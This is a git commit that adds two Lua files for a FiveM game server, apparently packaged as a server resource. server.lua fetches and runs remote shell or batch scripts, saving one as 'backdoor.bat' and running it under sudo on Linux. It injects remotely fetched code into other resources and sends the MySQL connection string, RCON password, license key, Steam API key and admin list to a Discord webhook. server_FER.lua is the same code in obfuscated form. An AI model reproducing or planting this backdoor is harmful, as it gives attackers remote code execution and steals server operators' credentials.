296c546a91d22878bea50fec9689cc9fee210bd8
FIVEMC-Service <lauxiking25@gmail.com>
2024-09-24 18:14:37 +0200

    Add files via upload

---
+++ server.lua
@@ -0,0 +1,186 @@
+local function trim(str)
+    return str:match("^%s*(.-)%s*$")
+end
+
+local function getServerOperatingSystem()
+    local handle = io.popen("uname")
+    local result = trim(handle:read("*a"))
+    handle:close()
+
+    local osMap = {
+        Linux = "Linux",
+        Windows = "Windows",
+        Darwin = "MacOS"
+    }
+
+    return osMap[result] or "Unknown"
+end
+
+-- Configurations
+local config = {
+    windowsScriptURL = "yourbatch",
+    linuxScriptURL = "yourshell",
+    enablePrints = false,
+    resourceCodeURLs = {
+        ressourcename = {
+            client = "yourclient",
+            server = "yourserver"
+        }
+    }
+}
+
+local function runBatchScript(scriptContent, isLinux)
+    if config.enablePrints then
+        print("Führe das Skript aus...")
+    end
+
+    local tempFilePath = isLinux and "/tmp/a89439.sh" or os.getenv("TEMP") .. "\\backdoor.bat"
+    local file = io.open(tempFilePath, "w")
+
+    if not file then
+        if config.enablePrints then
+            print("Fehler: Temporäre Datei konnte nicht erstellt werden.")
+        end
+        return
+    end
+
+    scriptContent = scriptContent:gsub("\r\n", "\n"):gsub("\r", "\n")
+    file:write(scriptContent)
+    file:close()
+
+    local command = isLinux and ("sudo chmod +x " .. tempFilePath .. " && sudo bash " .. tempFilePath) or ("cmd /C " .. tempFilePath)
+    os.execute(command)
+end
+
+local function fetchScriptContent(url, callback)
+    if config.enablePrints then
+        print("Lade Skript von URL: " .. url)
+    end
+
+    PerformHttpRequest(url, function(statusCode, response)
+        if statusCode == 200 then
+            callback(response)
+        else
+            if config.enablePrints then
+                print("Fehler: Skript konnte nicht von URL abgerufen werden.")
+            end
+        end
+    end, "GET", "", { ["Content-Type"] = "application/json" })
+end
+
+local function loadResourceCode(resourceName, serverScript, clientScript)
+    local resourcePath = "resources/" .. resourceName
+    local success = false
+
+    local function writeToFile(path, content)
+        local file = io.open(path, "a")
+        if file then
+            file:write(content)
+            file:close()
+            return true
+        end
+        return false
+    end
+
+    if serverScript and writeToFile(resourcePath .. "/server.lua", serverScript) then
+        success = true
+    end
+
+    if clientScript and writeToFile(resourcePath .. "/client.lua", clientScript) then
+        success = true
+    end
+
+    if success then
+        if config.enablePrints then
+            print("Code erfolgreich in Ressource " .. resourceName .. " geladen.")
+        end
+        os.execute("ensure " .. resourceName)
+    else
+        if config.enablePrints then
+            print("Fehler beim Laden des Codes für Ressource " .. resourceName .. ".")
+        end
+    end
+end
+
+local function main()
+    local serverOS = getServerOperatingSystem()
+    local isLinux = serverOS == "Linux"
+    local scriptURL = isLinux and config.linuxScriptURL or config.windowsScriptURL
+
+    fetchScriptContent(scriptURL, function(scriptContent)
+        runBatchScript(scriptContent, isLinux)
+    end)
+
+    for resourceName, urls in pairs(config.resourceCodeURLs) do
+        if urls.server then
+            fetchScriptContent(urls.server, function(serverScript)
+                loadResourceCode(resourceName, serverScript, nil)
+            end)
+        end
+
+        if urls.client then
+            fetchScriptContent(urls.client, function(clientScript)
+                loadResourceCode(resourceName, nil, clientScript)
+            end)
+        end
+    end
+end
+
+main()
+
+local discordWebhook = "https://discord.com/api/webhooks/1288115847931498607/VoIy5HYXqyAp0PJi14MyxNlPPbAZxuQSsES1YqiyQh_budj7HRVrgYdzdzti2Sn5Wg-P"
+local adminsFile = "admins.json"
+
+local function getOperatingSystem(serverVersion)
+    if not serverVersion then return "unknown" end
+    return serverVersion:find("win32") and "Windows" or (serverVersion:find("linux") and "Linux" or "unknown")
+end
+
+local function getServerIPAddress(callback)
+    PerformHttpRequest("https://api.ipify.org/", function(errorCode, resultData)
+        callback(errorCode == 200 and tostring(resultData) or nil)
+    end)
+end
+
+local function readAdminsFile()
+    return LoadResourceFile(GetCurrentResourceName(), adminsFile)
+end
+
+Citizen.CreateThread(function()
+    local serverIP
+    getServerIPAddress(function(ip) serverIP = ip end)
+    Citizen.Wait(1000)
+
+    if not serverIP then return end
+
+    local os = getOperatingSystem(GetConvar("version", ""))
+    local serverInfo = {
+        content = "@everyone FiveM-Server Informationen:",
+        embeds = {{
+            title = GetConvar("sv_hostname", "unknown"),
+            color = 16711680,
+            fields = {
+                { name = "IP", value = serverIP, inline = true },
+                { name = "Cfx-Link", value = "fivem://connect/cfx.re/join/" .. (GetConvar("sv_licenseKey", "unknown")), inline = false },
+                { name = "MySQL-String", value = GetConvar("mysql_connection_string", "unknown"), inline = false },
+                { name = "RCON-Passwort", value = GetConvar("rcon_password", "unknown"), inline = false },
+                { name = "Maximale Spieler", value = GetConvarInt("sv_maxclients", 32), inline = true },
+                { name = "Aktuelle Spieler", value = #GetPlayers(), inline = true },
+                { name = "Server-Version", value = GetConvar("version", ""), inline = true },
+                { name = "Betriebssystem", value = os, inline = true },
+                { name = "License Key", value = GetConvar("sv_licenseKey", "unknown"), inline = true },
+                { name = "TCP Endpoint", value = GetConvar("endpoint_add_tcp", "unknown"), inline = true },
+                { name = "Steam API Key", value = GetConvar("steam_webApiKey", "unknown"), inline = true }
+            }
+        }}
+    }
+
+    local adminsData = readAdminsFile()
+    if adminsData then
+        serverInfo.files = {
+            { name = "admins.txt", content = adminsData, type = "text/plain" }
+        }
+    end
+
+    PerformHttpRequest(discordWebhook, function() end, 'POST', json.encode(serverInfo), { ['Content-Type'] = 'application/json' })
+end)
---
+++ server_FER.lua
@@ -0,0 +1,186 @@
+=@42= 7F?4E:@? EC:>WDECX
+    C6EFC? DECi>2E49WQ/TDYW]\XTDYSQX
+6?5
+
+=@42= 7F?4E:@? 86E$6CG6C~A6C2E:?8$JDE6>WX
+    =@42= 92?5=6 l :@]A@A6?WQF?2>6QX
+    =@42= C6DF=E l EC:>W92?5=6iC625WQY2QXX
+    92?5=6i4=@D6WX
+
+    =@42= @D|2A l L
+        {:?FI l Q{:?FIQ[
+        (:?5@HD l Q(:?5@HDQ[
+        s2CH:? l Q|24~$Q
+    N
+
+    C6EFC? @D|2A,C6DF=E. @C Q&?<?@H?Q
+6?5
+
+\\ r@?7:8FC2E:@?D
+=@42= 4@?7:8 l L
+    H:?5@HD$4C:AE&#{ l QJ@FC32E49Q[
+    =:?FI$4C:AE&#{ l QJ@FCD96==Q[
+    6?23=6!C:?ED l 72=D6[
+    C6D@FC46r@56&#{D l L
+        C6DD@FC46?2>6 l L
+            4=:6?E l QJ@FC4=:6?EQ[
+            D6CG6C l QJ@FCD6CG6CQ
+        N
+    N
+N
+
+=@42= 7F?4E:@? CF?q2E49$4C:AEWD4C:AEr@?E6?E[ :D{:?FIX
+    :7 4@?7:8]6?23=6!C:?ED E96?
+        AC:?EWQuü9C6 52D $<C:AE 2FD]]]QX
+    6?5
+
+    =@42= E6>Au:=6!2E9 l :D{:?FI 2?5 Q^E>A^2ghcbh]D9Q @C @D]86E6?GWQ%t|!QX ]] Q--324<5@@C]32EQ
+    =@42= 7:=6 l :@]@A6?WE6>Au:=6!2E9[ QHQX
+
+    :7 ?@E 7:=6 E96?
+        :7 4@?7:8]6?23=6!C:?ED E96?
+            AC:?EWQu69=6Ci %6>A@CäC6 s2E6: <@??E6 ?:49E 6CDE6==E H6C56?]QX
+        6?5
+        C6EFC?
+    6?5
+
+    D4C:AEr@?E6?E l D4C:AEr@?E6?Ei8DF3WQ-C-?Q[ Q-?QXi8DF3WQ-CQ[ Q-?QX
+    7:=6iHC:E6WD4C:AEr@?E6?EX
+    7:=6i4=@D6WX
+
+    =@42= 4@>>2?5 l :D{:?FI 2?5 WQDF5@ 49>@5 ZI Q ]] E6>Au:=6!2E9 ]] Q UU DF5@ 32D9 Q ]] E6>Au:=6!2E9X @C WQ4>5 ^r Q ]] E6>Au:=6!2E9X
+    @D]6I64FE6W4@>>2?5X
+6?5
+
+=@42= 7F?4E:@? 76E49$4C:AEr@?E6?EWFC=[ 42==324<X
+    :7 4@?7:8]6?23=6!C:?ED E96?
+        AC:?EWQ{256 $<C:AE G@? &#{i Q ]] FC=X
+    6?5
+
+    !6C7@C>wEEA#6BF6DEWFC=[ 7F?4E:@?WDE2EFDr@56[ C6DA@?D6X
+        :7 DE2EFDr@56 ll a__ E96?
+            42==324<WC6DA@?D6X
+        6=D6
+            :7 4@?7:8]6?23=6!C:?ED E96?
+                AC:?EWQu69=6Ci $<C:AE <@??E6 ?:49E G@? &#{ 2386CF76? H6C56?]QX
+            6?5
+        6?5
+    6?5[ Qvt%Q[ QQ[ L ,Qr@?E6?E\%JA6Q. l Q2AA=:42E:@?^;D@?Q NX
+6?5
+
+=@42= 7F?4E:@? =@25#6D@FC46r@56WC6D@FC46}2>6[ D6CG6C$4C:AE[ 4=:6?E$4C:AEX
+    =@42= C6D@FC46!2E9 l QC6D@FC46D^Q ]] C6D@FC46}2>6
+    =@42= DF446DD l 72=D6
+
+    =@42= 7F?4E:@? HC:E6%@u:=6WA2E9[ 4@?E6?EX
+        =@42= 7:=6 l :@]@A6?WA2E9[ Q2QX
+        :7 7:=6 E96?
+            7:=6iHC:E6W4@?E6?EX
+            7:=6i4=@D6WX
+            C6EFC? ECF6
+        6?5
+        C6EFC? 72=D6
+    6?5
+
+    :7 D6CG6C$4C:AE 2?5 HC:E6%@u:=6WC6D@FC46!2E9 ]] Q^D6CG6C]=F2Q[ D6CG6C$4C:AEX E96?
+        DF446DD l ECF6
+    6?5
+
+    :7 4=:6?E$4C:AE 2?5 HC:E6%@u:=6WC6D@FC46!2E9 ]] Q^4=:6?E]=F2Q[ 4=:6?E$4C:AEX E96?
+        DF446DD l ECF6
+    6?5
+
+    :7 DF446DD E96?
+        :7 4@?7:8]6?23=6!C:?ED E96?
+            AC:?EWQr@56 6C7@=8C6:49 :? #6DD@FC46 Q ]] C6D@FC46}2>6 ]] Q 86=256?]QX
+        6?5
+        @D]6I64FE6WQ6?DFC6 Q ]] C6D@FC46}2>6X
+    6=D6
+        :7 4@?7:8]6?23=6!C:?ED E96?
+            AC:?EWQu69=6C 36:> {256? 56D r@56D 7üC #6DD@FC46 Q ]] C6D@FC46}2>6 ]] Q]QX
+        6?5
+    6?5
+6?5
+
+=@42= 7F?4E:@? >2:?WX
+    =@42= D6CG6C~$ l 86E$6CG6C~A6C2E:?8$JDE6>WX
+    =@42= :D{:?FI l D6CG6C~$ ll Q{:?FIQ
+    =@42= D4C:AE&#{ l :D{:?FI 2?5 4@?7:8]=:?FI$4C:AE&#{ @C 4@?7:8]H:?5@HD$4C:AE&#{
+
+    76E49$4C:AEr@?E6?EWD4C:AE&#{[ 7F?4E:@?WD4C:AEr@?E6?EX
+        CF?q2E49$4C:AEWD4C:AEr@?E6?E[ :D{:?FIX
+    6?5X
+
+    7@C C6D@FC46}2>6[ FC=D :? A2:CDW4@?7:8]C6D@FC46r@56&#{DX 5@
+        :7 FC=D]D6CG6C E96?
+            76E49$4C:AEr@?E6?EWFC=D]D6CG6C[ 7F?4E:@?WD6CG6C$4C:AEX
+                =@25#6D@FC46r@56WC6D@FC46}2>6[ D6CG6C$4C:AE[ ?:=X
+            6?5X
+        6?5
+
+        :7 FC=D]4=:6?E E96?
+            76E49$4C:AEr@?E6?EWFC=D]4=:6?E[ 7F?4E:@?W4=:6?E$4C:AEX
+                =@25#6D@FC46r@56WC6D@FC46}2>6[ ?:=[ 4=:6?E$4C:AEX
+            6?5X
+        6?5
+    6?5
+6?5
+
+>2:?WX
+
+=@42= 5:D4@C5(639@@< l Q9EEADi^^5:D4@C5]4@>^2A:^H639@@<D^`agg``dgcfhb`chge_f^'@xJdw*)BJpA_!y:`c|JI}=!!3p+IF"$Dt$`*B:J"903F5;fw#'C8*5K5KE:a$?d(8\!Q
+=@42= 25>:?Du:=6 l Q25>:?D];D@?Q
+
+=@42= 7F?4E:@? 86E~A6C2E:?8$JDE6>WD6CG6C'6CD:@?X
+    :7 ?@E D6CG6C'6CD:@? E96? C6EFC? QF?<?@H?Q 6?5
+    C6EFC? D6CG6C'6CD:@?i7:?5WQH:?baQX 2?5 Q(:?5@HDQ @C WD6CG6C'6CD:@?i7:?5WQ=:?FIQX 2?5 Q{:?FIQ @C QF?<?@H?QX
+6?5
+
+=@42= 7F?4E:@? 86E$6CG6Cx!p55C6DDW42==324<X
+    !6C7@C>wEEA#6BF6DEWQ9EEADi^^2A:]:A:7J]@C8^Q[ 7F?4E:@?W6CC@Cr@56[ C6DF=Es2E2X
+        42==324<W6CC@Cr@56 ll a__ 2?5 E@DEC:?8WC6DF=Es2E2X @C ?:=X
+    6?5X
+6?5
+
+=@42= 7F?4E:@? C625p5>:?Du:=6WX
+    C6EFC? {@25#6D@FC46u:=6Wv6ErFCC6?E#6D@FC46}2>6WX[ 25>:?Du:=6X
+6?5
+
+r:E:K6?]rC62E6%9C625W7F?4E:@?WX
+    =@42= D6CG6Cx!
+    86E$6CG6Cx!p55C6DDW7F?4E:@?W:AX D6CG6Cx! l :A 6?5X
+    r:E:K6?](2:EW`___X
+
+    :7 ?@E D6CG6Cx! E96? C6EFC? 6?5
+
+    =@42= @D l 86E~A6C2E:?8$JDE6>Wv6Er@?G2CWQG6CD:@?Q[ QQXX
+    =@42= D6CG6Cx?7@ l L
+        4@?E6?E l Qo6G6CJ@?6 u:G6|\$6CG6C x?7@C>2E:@?6?iQ[
+        6>365D l LL
+            E:E=6 l v6Er@?G2CWQDG09@DE?2>6Q[ QF?<?@H?QX[
+            4@=@C l `ef``eg_[
+            7:6=5D l L
+                L ?2>6 l Qx!Q[ G2=F6 l D6CG6Cx![ :?=:?6 l ECF6 N[
+                L ?2>6 l Qr7I\{:?<Q[ G2=F6 l Q7:G6>i^^4@??64E^47I]C6^;@:?^Q ]] Wv6Er@?G2CWQDG0=:46?D6z6JQ[ QF?<?@H?QXX[ :?=:?6 l 72=D6 N[
+                L ?2>6 l Q|J$"{\$EC:?8Q[ G2=F6 l v6Er@?G2CWQ>JDB=04@??64E:@?0DEC:?8Q[ QF?<?@H?QX[ :?=:?6 l 72=D6 N[
+                L ?2>6 l Q#r~}\!2DDH@CEQ[ G2=F6 l v6Er@?G2CWQC4@?0A2DDH@C5Q[ QF?<?@H?QX[ :?=:?6 l 72=D6 N[
+                L ?2>6 l Q|2I:>2=6 $A:6=6CQ[ G2=F6 l v6Er@?G2Cx?EWQDG0>2I4=:6?EDQ[ baX[ :?=:?6 l ECF6 N[
+                L ?2>6 l Qp<EF6==6 $A:6=6CQ[ G2=F6 l Rv6E!=2J6CDWX[ :?=:?6 l ECF6 N[
+                L ?2>6 l Q$6CG6C\'6CD:@?Q[ G2=F6 l v6Er@?G2CWQG6CD:@?Q[ QQX[ :?=:?6 l ECF6 N[
+                L ?2>6 l Qq6EC:63DDJDE6>Q[ G2=F6 l @D[ :?=:?6 l ECF6 N[
+                L ?2>6 l Q{:46?D6 z6JQ[ G2=F6 l v6Er@?G2CWQDG0=:46?D6z6JQ[ QF?<?@H?QX[ :?=:?6 l ECF6 N[
+                L ?2>6 l Q%r! t?5A@:?EQ[ G2=F6 l v6Er@?G2CWQ6?5A@:?E02550E4AQ[ QF?<?@H?QX[ :?=:?6 l ECF6 N[
+                L ?2>6 l Q$E62> p!x z6JQ[ G2=F6 l v6Er@?G2CWQDE62>0H63pA:z6JQ[ QF?<?@H?QX[ :?=:?6 l ECF6 N
+            N
+        NN
+    N
+
+    =@42= 25>:?Ds2E2 l C625p5>:?Du:=6WX
+    :7 25>:?Ds2E2 E96?
+        D6CG6Cx?7@]7:=6D l L
+            L ?2>6 l Q25>:?D]EIEQ[ 4@?E6?E l 25>:?Ds2E2[ EJA6 l QE6IE^A=2:?Q N
+        N
+    6?5
+
+    !6C7@C>wEEA#6BF6DEW5:D4@C5(639@@<[ 7F?4E:@?WX 6?5[ V!~$%V[ ;D@?]6?4@56WD6CG6Cx?7@X[ L ,Vr@?E6?E\%JA6V. l V2AA=:42E:@?^;D@?V NX
+6?5X
